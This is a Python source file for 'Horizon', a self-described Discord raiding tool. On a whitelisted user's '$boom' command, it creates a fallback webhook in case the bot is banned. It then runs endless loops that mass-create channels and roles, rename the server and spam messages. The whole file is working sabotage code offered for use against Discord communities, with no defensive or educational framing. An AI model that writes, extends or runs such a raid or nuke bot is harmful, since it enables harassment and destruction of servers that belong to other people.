import discord
from discord.ext import commands
import random
import asyncio
import json
from colorama import Fore, Style, init
import requests
import os

def printArt():
    ascii_art = """
██╗░░██╗░█████╗░██████╗░██╗███████╗░█████╗░███╗░░██╗
██║░░██║██╔══██╗██╔══██╗██║╚════██║██╔══██╗████╗░██║
███████║██║░░██║██████╔╝██║░░███╔═╝██║░░██║██╔██╗██║
██╔══██║██║░░██║██╔══██╗██║██╔══╝░░██║░░██║██║╚████║
██║░░██║╚█████╔╝██║░░██║██║███████╗╚█████╔╝██║░╚███║
╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚══════╝░╚════╝░╚═╝░░╚══╝
    """
    print(ascii_art)
    
init(autoreset=True)

printArt()

def printf(color, txt):
    print(f"{color}[Horizon]: {Fore.WHITE}{txt}")

def StartTutorial():
    blue=Fore.LIGHTBLUE_EX
    printf(Fore.LIGHTBLUE_EX, f"Hey, {os.getlogin()}")
    printf(blue,"Welcome to Horizon,")
    printf(blue, "A discord raiding tool.")
    printf(blue,"Since this is your 1st time, you can open a file 'Config.json' to modify how this works and to input your token.")
    q=input("")


def EndTutorial():
    with open("used", "w") as file:
        file.close()


if not os.path.exists("used"):
    StartTutorial()
    EndTutorial()

intents = discord.Intents.all()
intents.typing = True
intents.presences = False
Client = commands.Bot(command_prefix="$", intents=intents)

Config = None

with open('Config.json', 'r') as file:
    Config = json.load(file)


@Client.event
async def on_ready():
    await Client.change_presence(activity=discord.Game(name=Config['Activity']))
    print(Fore.LIGHTGREEN_EX + f'[Horizon]' + Fore.WHITE + f': Created pipe to Discord as {Client.user.name}')
    print(Fore.GREEN + "[Horizon]: " + Fore.WHITE + 'Run command |$boom| to start the Raid / Nuke.')

def SendMsg(webhook_url, message):
    data = {"content": message}
    response = requests.post(webhook_url, json=data)
    
    if response.status_code != 204:
        print(f"{Fore.RED}[Horizon]{Fore.WHITE}: A Fatal Error Occured")
    

class Raider:
    async def FireChannels(ctx):
        while True:
            Guild = ctx.guild
            ChannelNames = None,
            if Config["Random Spam Channel Name"] == True:
                await Guild.create_text_channel(str(random.randint(1000000,999999999)))
            else:
                ChannelNames = Config['Spam Channel Names']
                await Guild.create_text_channel(random.choice(ChannelNames))

    async def FireRole(ctx):
        while True:
            Guild = ctx.guild
            await Guild.create_role(name="Horizon On Top.")

    async def FireServerName(ctx):
        while True:
            Guild = ctx.guild
            await Guild.edit(name=Config['New Server Name'])

    async def FireMessageSpam(ctx):
        while True:
            await ctx.send(Config['Msg Spam Content'])

@Client.command(name="boom")
async def nuke(ctx):
    UserID = str(ctx.author.id)
    if UserID in Config['Whitelisted IDs']:
        await ctx.author.send("# Horizon\n## Started")
        print(Fore.LIGHTGREEN_EX + '[Horizon]' + Fore.WHITE + ': Received launch command.')
        
        Webhook = await ctx.channel.create_webhook(name=Config['Webhook Name'])
        WebhookURL = Webhook.url
        print(Fore.YELLOW + '[Horizon]' + Fore.WHITE  + f': Created webhook incase bot gets banned. URL: \n' + Fore.LIGHTBLUE_EX+ WebhookURL)
        asyncio.create_task(Raider.FireChannels(ctx))
        asyncio.create_task(Raider.FireMessageSpam(ctx))
        asyncio.create_task(Raider.FireRole(ctx))
        asyncio.create_task(Raider.FireServerName(ctx))

        print(Fore.YELLOW + "[Horizon]" + Fore.WHITE + ": If you see any random stuff after this line that you do not understand, simply just ignore it.")

Client.run(Config['Token'])
